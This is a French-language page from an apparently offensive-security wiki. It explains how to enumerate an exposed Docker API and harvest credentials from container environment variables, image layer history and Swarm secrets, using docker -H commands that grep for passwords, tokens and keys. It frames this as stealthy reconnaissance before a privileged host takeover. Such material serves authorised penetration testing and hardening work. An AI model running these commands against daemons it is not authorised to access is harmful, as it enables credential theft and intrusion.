---
order: 4
title: "Énumération de l'API : cartographier l'environnement à travers le daemon"
description: "Une fois l'API Docker atteignable, ses endpoints de lecture cartographient tout l'environnement avant même qu'un conteneur ne soit lancé : conteneurs en cours et arrêtés, leurs variables d'environnement et leurs labels, images et leurs historiques, réseaux, volumes et secrets de swarm. Cette énumération livre fréquemment des identifiants et une voie plus discrète que de lancer un nouveau conteneur."
keywords:
  - docker api
  - énumération
  - docker inspect
  - secrets de swarm
  - variables d'environnement
---

# Énumération de l'API

Une API Docker atteignable n'est pas seulement un point de lancement ; ses endpoints de lecture exposent l'environnement tout entier. Énumérer d'abord est plus discret que de lancer immédiatement un conteneur privilégié et souvent plus rapide, car les conteneurs en cours d'exécution détiennent déjà les secrets qui valent la peine d'être obtenus. Chaque appel ci-dessous est un simple `GET` qui fonctionne sur un 2375 ouvert ou un 2376 authentifié.

```bash
H=tcp://<target>:2375
# Containers, including environment variables and mounts via inspect
docker -H $H ps -a
docker -H $H inspect $(docker -H $H ps -aq) | \
  grep -iE '"Env"|PASSWORD|SECRET|TOKEN|KEY' 
# Images and their build history (secrets baked into layers show here)
docker -H $H images
docker -H $H history --no-trunc <image>
# Networks and volumes (volumes often hold data directories and credentials)
docker -H $H network ls; docker -H $H volume ls
```

## Secrets et configs de Swarm

Si le daemon est un gestionnaire Swarm, l'API expose les objets secret et config ainsi que les services qui les utilisent :

```bash
docker -H $H node ls                               # "Is Manager: true" => secrets reachable
docker -H $H secret ls; docker -H $H config ls
# Secrets are not returned by the API directly, but a service can mount them;
# inspect services to see which secrets map where, then read them from a task
docker -H $H service inspect $(docker -H $H service ls -q) | grep -iA3 Secrets
```

Les secrets Swarm sont livrés dans les tâches de service à `/run/secrets/<name>`, de sorte que lancer une tâche qui monte déjà un secret, ou y faire un exec, le révèle.

## Notes d'exploitation

- `inspect` sur les conteneurs en cours d'exécution est la source unique la plus riche : les variables d'environnement portent régulièrement des mots de passe de base de données, des clés cloud et des jetons d'API injectés au moment du déploiement.
- L'image `history --no-trunc` révèle les secrets ajoutés dans les couches `RUN`/`ENV` même s'ils ont été supprimés ensuite du système de fichiers ; voir [Secrets dans les couches d'image](../images-and-registries/secrets-in-image-layers.md).
- L'énumération est en lecture seule et peu bruyante ; utilisez-la pour décider si un conteneur existant fournit déjà ce dont vous avez besoin avant d'en lancer un privilégié via [Prise de contrôle de l'hôte via un run privilégié](host-takeover-via-privileged-run.md).

## Références

- [Docker Engine API reference](https://docs.docker.com/reference/api/engine/)
- [Docker: manage swarm secrets](https://docs.docker.com/engine/swarm/secrets/)
- [HackTricks: Docker enumeration](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
